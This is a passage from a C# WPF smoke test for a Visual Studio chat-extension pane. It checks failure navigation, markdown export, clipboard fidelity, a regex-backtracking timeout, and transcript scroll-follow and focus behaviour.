                    && failureRow.OpenTestHeader == "Go to scenario"
                    && failureRow.PrimaryLocationLabel == "Features/Calculator.feature:9"
                    && failureRow.LocationToolTip?.Contains("Failed at: Steps/CalculatorSteps.cs:26", StringComparison.Ordinal) == true;
                if (gotTestJump)
                {
                    // The row's own click command, not the menu's — that's the default under test.
                    _lastFileOpened = null;
                    failureRow!.OpenCommand.Execute(null);
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                    gotTestJump = _lastFileOpened is { Line: 9 } opened
                        && opened.Path.EndsWith("Calculator.feature", StringComparison.OrdinalIgnoreCase);
                }
                if (gotTestJump)
                {
                    // ...and the menu's second item still reaches the throw site.
                    _lastFileOpened = null;
                    failureRow!.OpenFailureCommand.Execute(null);
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                    gotTestJump = _lastFileOpened is { Line: 26 } threw
                        && threw.Path.EndsWith("CalculatorSteps.cs", StringComparison.OrdinalIgnoreCase);
                }
                if (gotTestJump)
                {
                    window.UpdateLayout();
                    var rowVisual = FindDescendantByDataContext<TestFailureViewModel>(window);
                    var menu = rowVisual?.ContextMenu;
                    if (menu is not null)
                    {
                        menu.PlacementTarget = rowVisual;
                        menu.IsOpen = true;
                        await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                        var headers = menu.Items.OfType<System.Windows.Controls.MenuItem>()
                            .Where(i => i.Visibility == Visibility.Visible)
                            .Select(i => i.Header as string).ToList();
                        gotTestJump = menu.Visibility == Visibility.Visible
                            // Test jump listed FIRST: it is the default action the row click performs.
                            && headers.Count == 2 && headers[0] == "Go to scenario" && headers[1] == "Go to failure";
                        menu.IsOpen = false;
                    }
                    else
                    {
                        gotTestJump = false;
                    }
                }

                // Markdown-export proof: the transcript serializes to one markdown document — the
                // user prompt and assistant reply under their role headings, tool rows with fenced
                // detail, and the (completed) plan as a ticked checkbox list.
                var markdown = vm.BuildTranscriptMarkdown();
                File.WriteAllText(Path.Combine(workDir, "transcript.md"), markdown); // inspectable artifact
                var gotMarkdown = markdown.Contains("## User", StringComparison.Ordinal)
                    && markdown.Contains("## Assistant", StringComparison.Ordinal)
                    && markdown.Contains("**Tool:**", StringComparison.Ordinal)
                    && markdown.Contains("```", StringComparison.Ordinal)
                    && markdown.Contains("- [x]", StringComparison.Ordinal);

                // Emoji clipboard round-trip proof: render emoji + a task list through the real
                // markdown path (the public MarkdownText seam), then read the document back through
                // ChatClipboard — the emoji characters and checkbox stand-ins must survive, proving
                // selection-copy fidelity headlessly (WPF's stock TextRange.Text drops both, since
                // they render as InlineUIContainers).
                var emojiViewer = new System.Windows.Controls.FlowDocumentScrollViewer();
                CodeWicket.UI.Markdown.MarkdownText.SetText(emojiViewer,
                    "Status ✅ and family 👩‍👩‍👧‍👧\n\n- [x] ticked\n- [ ] unticked");
                var emojiDoc = emojiViewer.Document!;
                var emojiCopy = CodeWicket.UI.Markdown.ChatClipboard.GetText(
                    new System.Windows.Documents.TextRange(emojiDoc.ContentStart, emojiDoc.ContentEnd));
                var gotEmojiRoundTrip = emojiCopy.Contains("✅", StringComparison.Ordinal)
                    && emojiCopy.Contains("👩‍👩‍👧‍👧", StringComparison.Ordinal)
                    && emojiCopy.Contains("[x]", StringComparison.Ordinal)
                    && emojiCopy.Contains("[ ]", StringComparison.Ordinal);

                // Syntax-highlight proof: a tagged fence must tokenize into multiple Runs (an
                // isolated "var" keyword run proves CodeHighlighter engaged, not the single-Run
                // plain fallback), while selection-copy still reads back the intact code text.
                var codeViewer = new System.Windows.Controls.FlowDocumentScrollViewer();
                CodeWicket.UI.Markdown.MarkdownText.SetText(codeViewer,
                    "```csharp\nvar x = 42; // hi\n```");
                var codeDoc = codeViewer.Document!;
                var codeRuns = codeDoc.Blocks.OfType<System.Windows.Documents.Paragraph>()
                    .SelectMany(p => p.Inlines.OfType<System.Windows.Documents.Run>())
                    .ToList();
                var codeCopy = CodeWicket.UI.Markdown.ChatClipboard.GetText(
                    new System.Windows.Documents.TextRange(codeDoc.ContentStart, codeDoc.ContentEnd));
                var gotSyntaxHighlight = codeRuns.Count > 1
                    && codeRuns.Any(r => r.Text == "var")
                    && codeCopy.Contains("var x = 42; // hi", StringComparison.Ordinal);

                // Regex-backtracking proof (issue #177): the reported payload — a truncated JSON
                // block, 570 chars — sent ColorCode's JSON pattern into exponential backtracking on
                // the UI thread and froze Visual Studio outright. CodeHighlighter now compiles that
                // pattern with a match deadline, which is the ONLY thing that terminates such a
                // match: a backtracking Regex cannot be cancelled or interrupted.
                //
                // This runs HERE as well as in CodeHighlighterTimeoutTests because the unit suite is
                // net10-only, and devenv loads the net472 slice — where the reported stack sat in
                // .NET Framework's own RegexInterpreter.Go. Broader coverage of the shipping
                // framework, not different coverage.
                //
                // Bounded on its own thread, because the defect is a HANG: on a build without the
                // deadline this never returns, and a gate that hangs reports nothing at all. The
                // thread is abandoned rather than stopped — there is nothing to stop it with, which
                // is the defect restated — so it is a background thread and cannot hold the process.
                var backtrackRuns = -1;
                var backtrackDone = new System.Threading.ManualResetEventSlim(false);
                var backtrackThread = new System.Threading.Thread(() =>
                {
                    try
                    {
                        var payload =
                            """{"\n  \"template-name\": \"IAM_SERVICE_ROLE\",\n  \"template-version\": \"1.1.0-PROD\",""" +
                            """\n  \"name\": \"AWS Dev Console Role\",\n  \"state-id\": \"aws-console-role-id\",""" +
                            """\n  \"parameters\": {\n    \"ROLE_TYPE\": \"console\",\n    \"IAM_POLICIES\": \"[""" +
                            """\n      \\\"/acmecorp/default/console-compute\\\",""" +
                            """\n      \\\"/acmecorp/default/console-compute-ec2\\\",""" +
                            """\n      \\\"/acmecorp/default/console-database\\\",""" +
                            """\n      \\\"/acmecorp/default/console-security\\\",""" +
                            """\n      \\\"/acmecorp/default/console-management\\\",""" +
                            """\n      \\\"/acmecorp/default/console-messaging\\\",""" +
                            """\n      \\\"/acmecorp/default/console-storage\\\",""" +
                            """\n      \\\"/acme""";
                        // A CLOSED fence, deliberately: an unclosed one is skipped before the
                        // tokenizer ever sees it, so it would pass without the deadline existing.
                        var doc = CodeWicket.UI.Markdown.MarkdownRenderFirewall.Render(
                            "```json\n" + payload + "\n```");
                        backtrackRuns = doc.Blocks.OfType<System.Windows.Documents.Paragraph>()
                            .Select(p => p.Inlines.OfType<System.Windows.Documents.Run>().ToList())
                            .Where(rs => string.Concat(rs.Select(r => r.Text))
                                .Contains("IAM_SERVICE_ROLE", StringComparison.Ordinal))
                            .Sum(rs => rs.Count);
                    }
                    catch
                    {
                        backtrackRuns = -2;
                    }
                    finally
                    {
                        backtrackDone.Set();
                    }
                })
                {
                    IsBackground = true,
                };
                backtrackThread.SetApartmentState(System.Threading.ApartmentState.STA);
                backtrackThread.Start();
                var backtrackReturned = backtrackDone.Wait(TimeSpan.FromSeconds(5));
                // One plain Run is the designed fallback, so this asserts the outcome and not just
                // that something came back: a deadline that returned a half-built document would
                // also "terminate".
                var gotBacktrackGuard = backtrackReturned && backtrackRuns == 1;

                // Input-resize wiring proof: the grip must be in the visual tree, hit-testable (an
                // untemplated or null-background Thumb is undraggable), and the undragged box must
                // still hold exactly its pre-grip bounds — one line, growing to ~6 with content. The
                // drag ARITHMETIC is pinned in ChatInputSizingTests; the gesture itself needs a real
                // pointer, so it stays a live-Visual-Studio check.
                window.UpdateLayout();
                var grip = FindDescendantByName(window, "InputResizeGrip") as System.Windows.Controls.Primitives.Thumb;
                var inputBox = FindDescendantByName(window, "InputBox") as System.Windows.Controls.TextBox;
                var gotInputResize = grip is { IsEnabled: true, ActualHeight: > 0 }
                    && grip.InputHitTest(new Point(grip.ActualWidth / 2, grip.ActualHeight / 2)) is not null
                    && grip.Cursor == System.Windows.Input.Cursors.SizeNS
                    && inputBox is { MinHeight: 28, MaxHeight: 120 };

                // Release-point pill proof: the chevron has to DROP DOWN. It was a flip — one chip
                // cycling two states behind a glyph that promises a list, so the only way to learn what
                // the other value was called was to change the setting. Driven as the gesture (a Click
                // on the pill) rather than by calling the handler, because what is under test is that
                // the click opens a menu at all; and the menu has to show which value is in force, or
                // its two items read as two actions instead of one setting.
                var releaseButton = FindDescendantByName(window, "PendingReleaseButton") as System.Windows.Controls.Button;
                var releaseMenu = releaseButton?.ContextMenu;
                releaseButton?.RaiseEvent(new RoutedEventArgs(
                    System.Windows.Controls.Primitives.ButtonBase.ClickEvent));
                await SettleAsync(window).ConfigureAwait(true);

                var releaseItems = releaseMenu?.Items.OfType<System.Windows.Controls.MenuItem>().ToList() ?? new List<System.Windows.Controls.MenuItem>();
                var menuOpened = releaseMenu is { IsOpen: true } && ReferenceEquals(releaseMenu.PlacementTarget, releaseButton);
                var menuNamesBoth = releaseItems.Count == 2
                    && releaseItems[0].Header is string s0 && s0.StartsWith("Steer", StringComparison.Ordinal)
                    && releaseItems[1].Header is string s1 && s1.StartsWith("Queue", StringComparison.Ordinal);
                // Exactly one tick, on the mode actually in force — checked against the view-model rather
                // than against the default, so this stays true whichever way the mode is left.
                // ...and it has to be OUR menu, not WPF's. A popup is its own visual tree, so an unstyled
                // ContextMenu shows the platform's light chrome inside a dark pane — which is what shipped,
                // for every right-click menu in the transcript as well as this one. Compared against the
                // resolved resources rather than a colour literal: the VSIX remaps these keys onto live VS
                // brushes, so a hard-coded expectation would pass here and be wrong in the IDE.
                var menuIsThemed = releaseMenu is not null
                    && ReferenceEquals(releaseMenu.Background, releaseMenu.TryFindResource("Chat.InputBackground"))
                    && ReferenceEquals(releaseMenu.BorderBrush, releaseMenu.TryFindResource("Chat.Border"))
                    && releaseItems.All(i => ReferenceEquals(i.Foreground, i.TryFindResource("Chat.Foreground")));

                var checkedItem = releaseItems.FirstOrDefault(i => i.IsChecked);
                var menuMarksTheMode = releaseItems.Count(i => i.IsChecked) == 1
                    && ReferenceEquals(checkedItem, vm.PendingReleaseIsNextStep ? releaseItems.FirstOrDefault() : releaseItems.Skip(1).FirstOrDefault());

                // And picking the OTHER one changes the setting — the pill's label is the readout, so it
                // has to move with it.
                var beforeLabel = vm.PendingReleaseLabel;
                var otherItem = releaseItems.FirstOrDefault(i => !i.IsChecked);
                otherItem?.Command?.Execute(null);
                await SettleAsync(window).ConfigureAwait(true);
                var menuChangesTheMode = vm.PendingReleaseLabel != beforeLabel
                    && releaseItems.Count(i => i.IsChecked) == 1
                    && !ReferenceEquals(releaseItems.FirstOrDefault(i => i.IsChecked), checkedItem);

                if (releaseMenu is not null)
                    releaseMenu.IsOpen = false;
                vm.TogglePendingReleaseCommand.Execute(null);   // back to where the rest of the run found it

                var gotReleaseMenu = menuOpened && menuNamesBoth && menuIsThemed && menuMarksTheMode && menuChangesTheMode;

                // Streaming-follow proof: the transcript must keep the newest text in view while a reply
                // streams. Appending to an EXISTING message is the case that broke — it raises
                // PropertyChanged, not CollectionChanged, so no item is added and the item-added scroll
                // never fired; a long thinking block grew out of the viewport and the view only lurched
                // to the bottom when the next item arrived. Driven directly rather than by timing a real
                // turn, so it pins the mechanism (growth without an add) instead of a race.
                var followItems = FindDescendantByName(window, "TranscriptItems");
                var followScroller = followItems is not null
                    ? FindDescendantOfType<System.Windows.Controls.ScrollViewer>(followItems, _ => true)
                    : null;
                // Seeds its own message rather than reusing whichever one the smoke happens to have left
                // in the transcript: this runs after several session switches, so depending on that made
                // the check silently skip (no assistant message => nothing appended => a false pass
                // waiting to happen). Removed again below so later checks see the transcript unchanged.
                var gotStreamFollow = false;
                // Captured DURING the probe: the transcript is restored afterwards, so reading the
                // scroller in the result string would report the cleaned-up state and tell you nothing
                // about which of the three phases failed.
                var followDetail = "skipped";
                if (followScroller is not null && followItems is UIElement followItemsEl
                    && window.Content is CodeWicket.UI.Views.ChatView followView)
                {
                    var followTarget = new MessageItemViewModel(MessageRole.Assistant, "Streaming follow probe.");
                    vm.Items.Add(followTarget);
                    followScroller.ScrollToEnd();
                    await SettleAsync(window);

                    // The transcript takes "the user is scrolling" from the INPUT rather than from the
                    // offset, so every phase below that means to scroll away has to raise the gesture the
                    // way WPF's input system does — the tunnelling half the view reads it from, then the
                    // move itself. A bare IScrollInfo call is not a gesture and (correctly) no longer
                    // stops the follow, so a harness that kept making them would be testing a path no
                    // user can take.
                    void WheelUp()
                    {
                        followItemsEl.RaiseEvent(new System.Windows.Input.MouseWheelEventArgs(
                            System.Windows.Input.Mouse.PrimaryDevice, Environment.TickCount, 120)
                        {
                            RoutedEvent = UIElement.PreviewMouseWheelEvent,
                        });
                        followScroller.RaiseEvent(new System.Windows.Input.MouseWheelEventArgs(
                            System.Windows.Input.Mouse.PrimaryDevice, Environment.TickCount, 120)
                        {
                            RoutedEvent = UIElement.MouseWheelEvent,
                        });
                    }

                    // The keyboard equivalent: the key press is the gesture, and the scroller's own
                    // IScrollInfo call is the move it produces.
                    void KeyScroll(System.Windows.Input.Key key, Action move)
                    {
                        followItemsEl.RaiseEvent(new System.Windows.Input.KeyEventArgs(
                            System.Windows.Input.Keyboard.PrimaryDevice,
                            PresentationSource.FromVisual(window), 0, key)
                        {
                            RoutedEvent = UIElement.PreviewKeyDownEvent,
                        });
                        move();
                    }

                    // Enough text to overflow the viewport several times over, appended the way a
                    // backend streams it rather than as one assignment.
                    for (var i = 0; i < 60; i++)
                        followTarget.Append($"\n\nStreamed paragraph {i} — long enough that the transcript must follow it.");
                    await SettleAsync(window);

                    var streamed = followScroller.ScrollableHeight > 0
                        && followScroller.VerticalOffset >= followScroller.ScrollableHeight - 24;
                    var streamedAt = $"{followScroller.VerticalOffset:F0}/{followScroller.ScrollableHeight:F0}";

                    // Scrolling up must STOP the follow, so the agent can't yank the view off something
                    // being read mid-turn. Without this half, "always scroll to end" would also pass.
                    // BOTH ways of moving away from the bottom, because they carry intent differently and
                    // each one caught a distinct bug:
                    //
                    //   PageUp is the keyboard gesture — the key press says the user is scrolling, the
                    //   IScrollInfo call is the move it produces.
                    //   BringItemIntoView is the plan strip's "take me there", which a user can click
                    //   mid-turn while content is still streaming. It is the one programmatic scroll that
                    //   carries intent, and it sets a PENDING offset applied during layout — so the
                    //   follow could cancel it before it ever landed and the view simply refused to move.
                    //   Testing only the gesture would have left that live.
                    //
                    // Sampled through the jump, because "how far is the bottom" is an ESTIMATE while items
                    // are unrealised and the follow rules have to know whether that estimate can ever
                    // collapse far enough to read as "there is nothing to scroll" on a transcript that
                    // plainly has. Reported rather than asserted: it is a measurement of WPF, not of us.
                    // Measured at 1686 of 2105 — a fifth off, nowhere near collapsing.
                    var minScrollableWhileAway = followScroller.ScrollableHeight;
                    for (var i = 0; i < 4; i++)
                    {
                        KeyScroll(System.Windows.Input.Key.PageUp, followScroller.PageUp);
                        await SettleAsync(window);
                        minScrollableWhileAway = Math.Min(minScrollableWhileAway, followScroller.ScrollableHeight);
                    }

                    followView.BringItemIntoView(vm.Items[0]);
                    await SettleAsync(window);
                    minScrollableWhileAway = Math.Min(minScrollableWhileAway, followScroller.ScrollableHeight);

                    var afterScrollUp = $"{followScroller.VerticalOffset:F0}";
                    followTarget.Append("\n\nMore text arriving while the user is reading history.");
                    await SettleAsync(window);
                    // Well clear of the bottom is the assertion, not offset zero: PageUp moves by
                    // viewports, and the point is that the append did not drag the view back down.
                    var stayedPut = followScroller.VerticalOffset
                        < followScroller.ScrollableHeight - followScroller.ViewportHeight;
                    var stayedAt = $"up->{afterScrollUp} then {followScroller.VerticalOffset:F0}/{followScroller.ScrollableHeight:F0}"
                        + $" (minScrollableWhileAway={minScrollableWhileAway:F0})";

                    // ...and coming back to the bottom must resume it.
                    followScroller.ScrollToEnd();
                    await SettleAsync(window);
                    followTarget.Append("\n\nAnd once back at the bottom, following resumes.");
                    await SettleAsync(window);
                    var resumed = followScroller.VerticalOffset >= followScroller.ScrollableHeight - 24;
                    var resumedAt = $"{followScroller.VerticalOffset:F0}/{followScroller.ScrollableHeight:F0}";

                    // Content SHRINKING while parked at the bottom must not read as the user scrolling
                    // away. Shrinking is routine mid-turn — a tool row's live output replaced by a
                    // shorter result, a card collapsing, the typing indicator clearing — and the
                    // scroller clamps the offset down to the new bottom by itself, which arrives as an
                    // upward move the direction test cannot tell from a deliberate one. Getting this
                    // wrong strands the rest of the turn below the fold while the view still LOOKS
                    // parked at the bottom, which is exactly how it was reported.
                    var grownText = followTarget.Text;
                    followTarget.Text = "Shrunk to a single line.";
                    await SettleAsync(window);
                    var afterShrinkAt = $"{followScroller.VerticalOffset:F0}/{followScroller.ScrollableHeight:F0}";
                    followTarget.Text = grownText + "\n\nAnd growth after a shrink must still be followed.";
                    await SettleAsync(window);
                    var followedAfterShrink = followScroller.VerticalOffset >= followScroller.ScrollableHeight - 24;
                    var shrinkAt = $"shrunk@{afterShrinkAt} then {followScroller.VerticalOffset:F0}/{followScroller.ScrollableHeight:F0}";

                    // A SMALL scroll up must stop the follow too. Every phase above moves FAR from the
                    // bottom (PageUp x4, then a jump to the first item), so none of them exercised the
                    // case the user actually hits: ONE notch of the wheel, a gesture small enough that
                    // every test measuring distance-to-bottom would call it "still parked at the end".
                    // That is what a follow rule reading the offset gets wrong and a rule reading the
                    // gesture cannot.
                    var beforeNudge = followScroller.VerticalOffset;
                    WheelUp();
                    await SettleAsync(window);

                    var afterNudge = followScroller.VerticalOffset;
                    followTarget.Append("\n\nStreaming continues after a small scroll up.");
                    await SettleAsync(window);
                    // Two conditions, because either one alone can pass for the wrong reason: the nudge
                    // must actually have moved the view (otherwise there was no gesture to honour), and
                    // the append must not have dragged it back down.
                    var nudgedStayedPut = afterNudge < beforeNudge
                        && followScroller.VerticalOffset <= afterNudge + 1;
                    var nudgedAt = $"{beforeNudge:F0}->{afterNudge:F0} one notch "
                        + $"then {followScroller.VerticalOffset:F0}/{followScroller.ScrollableHeight:F0}";

                    // A SLOW scroll up must unpin as reliably as a fast one. This is the phase above with
                    // the agent still talking THROUGH the gesture, which is what makes it different: the
                    // deltas arriving between notches each get a say, and a rule that re-pins on any
                    // downward-looking change while the user is still near the bottom yanks the view back
                    // on the next one. Scrolling fast clears that zone in a notch or two, which is why
                    // this only ever reproduced when done gently.
                    followScroller.ScrollToEnd();
                    await SettleAsync(window);
                    followTarget.Append("\n\nBack at the bottom, following again.");
                    await SettleAsync(window);

                    var slowSnappedBack = false;
                    var slowDetail = "";
                    for (var i = 0; i < 4; i++)
                    {
                        WheelUp();
                        await SettleAsync(window);
                        var afterLine = followScroller.VerticalOffset;

                        followTarget.Append($"\n\nDelta {i} arriving mid-gesture, while the user reads.");
                        await SettleAsync(window);

                        // The delta must not move the view DOWN. Growth alone never moves the offset, so
                        // any downward move here is the follow having re-engaged mid-gesture.
                        if (followScroller.VerticalOffset > afterLine + 1)
                        {
                            slowSnappedBack = true;
                            slowDetail = $"notch {i}: {afterLine:F0} -> {followScroller.VerticalOffset:F0}";
                            break;
                        }
                    }

                    var slowScrollStayedPut = !slowSnappedBack;
                    var slowAt = slowSnappedBack
                        ? slowDetail
                        : $"held {followScroller.VerticalOffset:F0}/{followScroller.ScrollableHeight:F0}";

                    // "Jump to latest" must appear once following has stopped, and must put the user back
                    // on the newest content. It is the only way back that does not depend on landing
                    // exactly on the bottom, so it is what makes the tight re-pin threshold safe — a
                    // thumb drag stopping a few px short would otherwise leave no route back at all.
                    // (We arrive here unpinned, from the slow-scroll phase above.)
                    var jumpButton = FindDescendantByName(window, "JumpToLatestButton")
                        as System.Windows.Controls.Button;
                    var jumpOffered = jumpButton?.Visibility == Visibility.Visible;

                    // Focused first, because a real click does that and the button then HIDES itself —
                    // leaving WPF to re-home the keyboard focus it was holding. RaiseEvent alone moves
                    // no focus, so a check that skipped this would never see the case at all.
                    var jumpTookFocus = jumpButton?.Focus() == true;
                    jumpButton?.RaiseEvent(new RoutedEventArgs(
                        System.Windows.Controls.Primitives.ButtonBase.ClickEvent));
                    await SettleAsync(window);
                    var jumpFocusLanded = (System.Windows.Input.Keyboard.FocusedElement
                        ?? System.Windows.Input.FocusManager.GetFocusedElement(window)) as FrameworkElement;
                    var jumpFocusName = jumpFocusLanded is null
                        ? "<null>"
                        : (string.IsNullOrEmpty(jumpFocusLanded.Name)
                            ? jumpFocusLanded.GetType().Name
                            : jumpFocusLanded.Name);

                    var jumpedToBottom = followScroller.VerticalOffset
                        >= followScroller.ScrollableHeight - 24;
                    // ...and following is genuinely back on, not merely scrolled once: the proof is that
                    // the NEXT delta is followed without another gesture.
                    followTarget.Append("\n\nFollowed again after jumping to latest.");
                    await SettleAsync(window);
                    var jumpResumedFollow = followScroller.VerticalOffset
                        >= followScroller.ScrollableHeight - 24;
                    // Offered only while it is needed: back at the bottom, the button goes away again.
                    var jumpHidesWhenFollowing = jumpButton?.Visibility != Visibility.Visible;

                    // ...and the focus it took has to be LANDED somewhere, not abandoned. The button
                    // hides itself the moment following resumes, so WPF re-homes the keyboard focus it
                    // was holding on whatever it happens to find — reported as the next Up arrow moving
                    // the selection into the permission banner instead of the caret in the message being
                    // written. The composer is where focus lives in this pane.
                    var jumpReturnedFocus = jumpFocusName == "InputBox";
                    var gotJumpToLatest = jumpOffered && jumpedToBottom && jumpResumedFollow
                        && jumpHidesWhenFollowing && jumpTookFocus && jumpReturnedFocus;
                    var jumpAt = $"offered={jumpOffered}, tookFocus={jumpTookFocus}, "
                        + $"focusLanded={jumpFocusName} (foreground={ForegroundStamp()}), atBottom={jumpedToBottom}, "
                        + $"resumed={jumpResumedFollow}, hidden={jumpHidesWhenFollowing} "
                        + $"@{followScroller.VerticalOffset:F0}/{followScroller.ScrollableHeight:F0}";

                    // === Issue #90: things that move the view WITHOUT the user scrolling ===
                    // The common thread in all three is the user's own sentence on the issue: "we haven't
                    // scrolled in these last two scenarios, so if we were at the end before we should be
                    // at the end afterwards". Each drives a different non-gesture source of movement.

                    // (2) A permission banner (issue #90, reported as the same symptom). It sits on its own Auto row of the same Grid, so showing
                    // and dismissing it takes height from the transcript's viewport and gives it back —
                    // again with no gesture, and again arriving as an unrequested upward move when the
                    // scroller clamps an offset that no longer exists. Driven through the real banner
                    // rather than by resizing something, because the viewport change is only half of it:
                    // answering also moves focus, which is its own source of scrolling.
                    followScroller.ScrollToEnd();
                    await SettleAsync(window);
                    var viewportBeforeBanner = followScroller.ViewportHeight;
                    // The smoke's auto-allow answers a banner the instant it is offered, which would
                    // resolve this one inside the property change and leave nothing to lay out — the
                    // banner has to actually occupy its row for the viewport to change at all.
                    vm.PropertyChanged -= AutoAllow;
                    _ = vm.RequestPermissionAsync(new PermissionRequestDto(
                        "follow-banner", "Write notes.txt", "edit", null, null,
                        new[]
                        {
                            new PermissionOptionDto("allow_once", "Allow", "AllowOnce"),
                            new PermissionOptionDto("reject_once", "Deny", "RejectOnce"),
                        }));
                    // Held across the settle: the banner is what takes the height, so the check needs it
                    // to still be answerable afterwards even if something else has moved the queue on.
                    var followBanner = vm.PendingPermission;
                    await SettleAsync(window);
                    // The precondition is not just "a banner exists" but "it took height from the
                    // transcript" — the viewport shrinking is the whole mechanism under test, and a
                    // banner that failed to render would otherwise let this pass by never happening.
                    var viewportWithBanner = followScroller.ViewportHeight;
                    var bannerUp = followBanner is not null && vm.HasPendingPermission
                        && viewportWithBanner < viewportBeforeBanner;
                    // Answered through the button in the visual tree, focused first, because the banner
                    // then leaves: this is the same "a focused control hides itself" shape the jump pill
                    // had, and the reported symptom named the permission box specifically.
                    var bannerButton = FindDescendantOfType<System.Windows.Controls.Button>(
                        window, b => (b.Content as string) == "Allow"
                            || (b.Content is System.Windows.Controls.TextBlock t && t.Text == "Allow"));
                    // Through the button's own Command, not by raising its Click: a Command-bound button
                    // executes from ButtonBase.OnClick, which only real input reaches — raising the
                    // routed event runs the handlers and nothing else, so a check that raises Click
                    // leaves the banner up and measures the focus still sitting on a visible Allow.
                    var bannerTookFocus = bannerButton?.Focus() == true;
                    if (bannerButton?.Command is { } bannerCommand)
                        bannerCommand.Execute(bannerButton.CommandParameter);
                    else
                        followBanner?.Options
                            .FirstOrDefault(o => string.Equals(o.Kind, "AllowOnce", StringComparison.OrdinalIgnoreCase))
                            ?.Command.Execute(null);
                    vm.PropertyChanged += AutoAllow;
                    await SettleAsync(window);
                    var bannerFocusLanded = (System.Windows.Input.Keyboard.FocusedElement
                        ?? System.Windows.Input.FocusManager.GetFocusedElement(window)) as FrameworkElement;
                    var bannerFocusName = bannerFocusLanded is null
                        ? "<null>"
                        : (string.IsNullOrEmpty(bannerFocusLanded.Name)
                            ? bannerFocusLanded.GetType().Name
                            : bannerFocusLanded.Name);

                    var bannerStillAtBottom = followScroller.VerticalOffset
                        >= followScroller.ScrollableHeight - 24;
                    var bannerKeptFollowing = !followView.ShowJumpToLatest;
                    followTarget.Append("\n\nA delta after the permission banner cleared.");
                    await SettleAsync(window);
                    var bannerFollowedAfter = followScroller.VerticalOffset
                        >= followScroller.ScrollableHeight - 24;
                    // Same rule as the jump pill: a control that hides itself must LAND the focus it
                    // took, not abandon it to the window, or the next arrow key is directional
                    // navigation into whatever happens to be nearest.
                    var bannerReturnedFocus = bannerFocusName == "InputBox";

                    // ...and the other half of that rule: focus sitting on a REAL control is the user's.
                    // A banner has more ways to leave than being answered — the turn ending cancels it,
                    // a session switch clears it — and any of those can land while the user is somewhere
                    // else entirely, so reclaiming unconditionally would be a focus steal rather than a
                    // fix. Driven by clearing a second banner while the export button holds the focus.
                    var otherFocus = FindDescendantByName(window, "ExportButton") as System.Windows.Controls.Button;
                    vm.PropertyChanged -= AutoAllow;
                    _ = vm.RequestPermissionAsync(new PermissionRequestDto(
                        "follow-banner-2", "Write notes.txt", "edit", null, null,
                        new[] { new PermissionOptionDto("allow_once", "Allow", "AllowOnce") }));
                    var secondBanner = vm.PendingPermission;
                    await SettleAsync(window);
                    var otherTookFocus = otherFocus?.Focus() == true;
                    secondBanner?.Options.FirstOrDefault()?.Command.Execute(null);
                    vm.PropertyChanged += AutoAllow;
                    await SettleAsync(window);
                    var keptOtherFocus = otherTookFocus
                        && ReferenceEquals(System.Windows.Input.Keyboard.FocusedElement, otherFocus);
                    var gotBannerFollow = bannerUp && bannerStillAtBottom && bannerKeptFollowing
                        && bannerFollowedAfter && bannerTookFocus && bannerReturnedFocus
                        && keptOtherFocus;
                    var bannerFollowAt = $"shown={bannerUp} (queued={followBanner is not null}, "
                        + $"viewport {viewportBeforeBanner:F0}->{viewportWithBanner:F0}), "
                        + $"atBottom={bannerStillAtBottom}, tookFocus={bannerTookFocus}, "
                        + $"focusLanded={bannerFocusName} (foreground={ForegroundStamp()}), keptOtherFocus={keptOtherFocus} "
                        + $"(took={otherTookFocus}, now={(System.Windows.Input.Keyboard.FocusedElement as FrameworkElement)?.Name}), "
                        + $"pillHidden={bannerKeptFollowing}, followedAfter={bannerFollowedAfter} "
                        + $"@{followScroller.VerticalOffset:F0}/{followScroller.ScrollableHeight:F0}";

                    gotStreamFollow = streamed && stayedPut && resumed && followedAfterShrink
                        && nudgedStayedPut && slowScrollStayedPut && gotJumpToLatest
                        && gotBannerFollow;
                    followDetail = $"streamed={streamed} @{streamedAt}, stayedPut={stayedPut} @{stayedAt}, "
                        + $"resumed={resumed} @{resumedAt}, followedAfterShrink={followedAfterShrink} @{shrinkAt}, "
                        + $"nudgedStayedPut={nudgedStayedPut} @{nudgedAt}, "
                        + $"slowScrollStayedPut={slowScrollStayedPut} @{slowAt}, "
                        + $"jumpToLatest={gotJumpToLatest} @{jumpAt}, "
                        + $"banner={gotBannerFollow} @{bannerFollowAt}";

                    vm.Items.Remove(followTarget);
                    await SettleAsync(window);
                }

                // Issue #90's other two scenarios, in a window of their own. Both need a transcript the
                // probe above cannot provide: one that FITS (nothing to scroll at all), and one long
                // enough that the virtualising panel is genuinely ESTIMATING its extent — the probe's is
                // a single very tall message, which realises whole and estimates nothing.
                var gotEmptyWheel = false;
                var emptyWheelDetail = "skipped";
                var gotTabSwitchFollow = false;
                var tabSwitchDetail = "skipped";
                var scenarioVm = new ChatViewModel(_engine!,
                    new StartSessionRequest("fake", null, workDir, modeName, null), sessionStore: store);
                var scenarioWindow = new MainWindow
                {
                    DataContext = scenarioVm,
                    Width = 500,
                    Height = 400,
                    ShowInTaskbar = false,
                    Left = -20000,
                    Top = -20000,
                };
                scenarioWindow.Show();
                await SettleAsync(scenarioWindow);
                if (FindDescendantByName(scenarioWindow, "TranscriptItems") is UIElement scenarioItems
                    && scenarioWindow.Content is CodeWicket.UI.Views.ChatView scenarioView
                    && FindDescendantOfType<System.Windows.Controls.ScrollViewer>(scenarioItems, _ => true)
                        is { } scenarioScroller)
                {
                    // A wheel, raised as WPF's input system raises one: the tunnelling half first (which
                    // is what the view reads the gesture from) and then the bubbling half on the scroller
                    // (which is what actually moves it). Both are needed — a test-only seam would prove
                    // nothing about the path a real wheel takes.
                    void WheelUp()
                    {
                        scenarioItems.RaiseEvent(new System.Windows.Input.MouseWheelEventArgs(
                            System.Windows.Input.Mouse.PrimaryDevice, Environment.TickCount, 120)
                        {
                            RoutedEvent = UIElement.PreviewMouseWheelEvent,
                        });
                        scenarioScroller.RaiseEvent(new System.Windows.Input.MouseWheelEventArgs(
                            System.Windows.Input.Mouse.PrimaryDevice, Environment.TickCount, 120)
                        {
                            RoutedEvent = UIElement.MouseWheelEvent,
                        });
                    }

                    // (1) A wheel over a transcript with nothing to scroll. Reported as "mouse wheel up
                    // when there's no content brings up the last message pill": the gesture is real but
                    // it MOVES NOTHING, so the view is still showing everything — and because nothing
                    // moved, no scroll change ever arrives to undo it, leaving the pill offered forever
                    // on a chat that is already at its end.
                    //
                    // The precondition IS the case: nothing to scroll. Asserted rather than assumed, or
                    // a transcript that had somehow grown would make this pass by never being the case.
                    var nothingToScroll = scenarioScroller.ScrollableHeight <= 0;
                    WheelUp();
